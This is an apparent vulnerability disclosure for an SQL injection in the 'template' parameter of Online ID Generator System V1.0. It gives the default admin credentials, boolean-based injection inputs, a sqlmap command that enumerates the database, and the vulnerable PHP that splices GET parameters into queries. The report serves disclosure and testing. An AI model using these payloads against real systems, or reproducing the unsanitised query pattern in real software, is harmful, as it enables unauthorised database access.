# [Online ID Generator System-SQL Injection-generate/index.php-template]

## Basic Information

**[Bug Reporter]:** DililLearngent

**[Application Vendors]:** https://www.sourcecodester.com/php/14917/online-id-generator-system-using-php-free-source-code.html

**[Affected Version]:** Online ID Generator System V1.0

**[Test Environment]:** windows10+apache+php7.0

**[Install]:**

1. start **Apache** and **MySQL**.

2. **Extract** the downloaded source code **zip** file.

3. **Copy** the extracted source code folder and **paste** it into the **www directory**.

4. **Create** a **new database** naming **"id_generator_db"**.

5. **Import** the provided **`SQL`** file. The file is known as **`id_generator_db.sql`** located inside the **database** folder.

6. **Browse** the **Online ID Generator System** in a **browser**. i.e. **`http://localhost/id_generator`**.

   **Admin Access Information:**

   Username: **admin**
   Password: **admin123**

## Bug Information

**[Vulnerability type]:** SQL Injection

**[Vulnerability Url]:** `http://localhost/id_generator/admin/?page=generate&template=4`    

**[Vulnerability Location]:** id_generator/admin/generate/index.php

**[Vulnerability Test]:**

1. When you enter `4' and '1'='1` in the `template` parameter, the page displays as follows:

   ![](../../img/20240623005539.png)

   

2. When you enter `4' and '1'='2` in the `template` parameter, the page displays as follows:

   ![](../../img/20240623005843.png)

3. Testing with sqlmap

   ```
   python sqlmap.py -u "http://localhost/id_generator/admin/?page=generate&template=4" -p "template" --cookie="PHPSESSID=c6ikif3reuhfclaa66bo04s2sj" --current-db
   ```

   ![](../../img/20240623010229.png)

**[code analysis]:**

id_generator/admin/generate/index.php

```php
<?php 
    if(isset($_GET['template'])){
        $qry = $conn->query("SELECT * FROM `id_format` where id = '{$_GET['template']}' ");
        foreach($qry->fetch_assoc() as $k => $v){
            $$k = $v;
        }
    }
    if(isset($_GET['id'])){
        $qry = $conn->query("SELECT * FROM `generated_id` where id = '{$_GET['id']}' ");
        foreach($qry->fetch_assoc() as $k => $v){
            $meta[$k] = $v;
        }
    }
?>
```

The GET parameter `template` is obtained without any filtering and spliced directly into the sql execution statement, and then a different page response exists depending on the result of the execution.